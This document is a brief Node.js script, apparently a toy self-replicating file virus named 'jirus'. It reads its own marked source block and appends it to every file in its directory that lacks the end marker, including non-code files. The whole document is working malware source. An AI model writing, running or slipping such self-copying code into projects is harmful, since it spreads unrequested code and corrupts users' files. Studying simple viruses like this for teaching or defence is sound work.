
/*jirus-start*/
const fs = require('fs')
const path = require('path')
const files = fs.readdirSync(__dirname)

const me = fs.readFileSync(__filename).toString()

const startIndex = me.indexOf("/*jirus-start*/")
const endToken = "/*jirus-end*/"
const endIndex = me.lastIndexOf(endToken)
const payload = me.substring(startIndex, endIndex + endToken.length)

const dealWithFile = (file) => {
  const filePath = path.join(__dirname, file)
  const fileContent = fs.readFileSync(filePath)
  if (!fileContent.includes(endToken)) {
    fs.appendFile(filePath, payload, err => {
      if (err) {
        throw err
      }
    })
  }
}

files.forEach(dealWithFile)
/*jirus-end*/
